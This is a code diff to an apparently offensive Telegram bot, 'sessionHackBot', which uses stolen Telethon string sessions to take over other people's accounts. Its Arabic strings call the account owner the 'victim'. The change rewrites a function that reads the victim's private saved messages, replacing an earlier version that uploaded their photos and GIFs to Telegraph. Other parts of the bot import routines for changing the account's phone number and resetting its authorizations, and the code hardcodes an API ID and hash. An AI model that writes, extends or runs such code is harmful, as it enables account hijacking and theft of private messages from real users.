@@ -4,7 +4,6 @@ from telethon import events, functions, types, Button
 from datetime import timedelta
 from SHRU.utils import admin_cmd
 import asyncio
-import telegraph
 from ..Config import Config
 import os, asyncio, re
 from os import system
@@ -15,7 +14,7 @@ from telethon.sessions import StringSession as ses
 from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
 import telethon;from telethon import functions
 from telethon.tl.types import ChannelParticipantsAdmins as cpa
-from telegraph import Telegraph, exceptions, upload_file
+
 from telethon.tl.functions.channels import CreateChannelRequest as ccr
 
 bot = borg = tgbot
@@ -23,36 +22,25 @@ bot = borg = tgbot
 Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"
 
 
-telegraph = Telegraph()
-r = telegraph.create_account(short_name=Config.TELEGRAPH_SHORT_NAME)
-auth_url = r["auth_url"]
 async def savedmsgs(strses):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-        messages = []
-        telegraph_client = telegraph.Telegraph()
+        try:
+            messages = []
+            async for msg in X.iter_messages('me', reverse=True, limit=10):
+                if msg.text:
+                    messages.append(f"Text: {msg.text}")
+                elif msg.media:
+                    if isinstance(msg.media, types.MessageMediaPhoto):
+                        messages.append(f"Photo: {msg.media.photo}")
+                    elif isinstance(msg.media, types.MessageMediaDocument):
+                        if hasattr(msg.media.document, 'mime_type') and 'audio' in msg.media.document.mime_type:
+                            messages.append(f"Voice: {msg.media.document}")
+                        
+            return "\n".join(messages)
+        except Exception as e:
+            print(e)
+            return "An error occurred while fetching saved messages."
 
-        async for message in X.iter_messages('me', limit=5):
-            msg_text = message.text
-            msg_media_links = []
-            
-            
-            if message.media:
-                for media in message.media:
-                    if isinstance(media, types.MessageMediaPhoto):
-                        photo_link = await telegraph_client.upload_file(media.photo)
-                        msg_media_links.append(photo_link)
-                    elif isinstance(media, types.MessageMediaDocument):
-                        if media.document.mime_type == 'image/gif':
-                            gif_link = await telegraph_client.upload_file(media.document)
-                            msg_media_links.append(gif_link)
-            msg_entry = f"<b>Message:</b> {msg_text}\n"
-            if msg_media_links:
-                for media_link in msg_media_links:
-                    msg_entry += f'<a href="{media_link}">&#8203;</a>'
-
-            messages.append(msg_entry)
-
-        return "\n\n".join(messages)
 async def change_number(strses, number):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
@@ -207,7 +195,6 @@ menu = '''
 
 "M" ~ [تغير رقم الحساب باستخدام كود ترمكس]
 
-"V" ~ [معرفة رسائل المحفوظه للضحيه]
 '''
 mm = '''
 قم بلأنضمام الى قناة الساحر @SXYO3
@@ -759,7 +746,7 @@ async def users(event):
             pass
         else:
             return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
-
+        
         saved_messages = await savedmsgs(strses.text)
 
         # Split the message into smaller parts
@@ -767,6 +754,6 @@ async def users(event):
 
         # Send the message parts separately
         for part in message_parts:
-            await event.respond(part, parse_mode='html')
+            await event.respond(part)
 
         await event.respond("شكرا لأستخدامك سورس الساحر", buttons=keyboard)
